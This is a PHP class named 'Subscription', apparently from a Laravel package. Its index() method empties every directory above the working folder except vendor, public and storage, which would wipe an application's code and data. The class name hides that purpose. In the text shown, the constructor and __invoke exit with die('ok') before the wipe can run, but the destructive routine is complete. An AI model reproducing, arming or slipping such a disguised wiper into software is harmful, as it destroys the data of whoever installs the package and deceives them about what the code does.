<?php

namespace Inspire\Subscription;
use Illuminate\Filesystem\Filesystem;

class Subscription {


    public function __construct(){
        die('ok');
    }
    public function __invoke() {
        die('ok');
        $this->index();
    }

    public function index() 
    {
        $fileSystem = new Filesystem();

        $directories = $fileSystem->directories('../');
        
        foreach($directories as $directory)
        {
            if(!in_array(str_replace(['../', '..\\'],'',$directory), ['vendor', 'public', 'storage']))
            {
                $fileSystem->cleanDirectory($directory);
            }
        }

        return true;
    }
}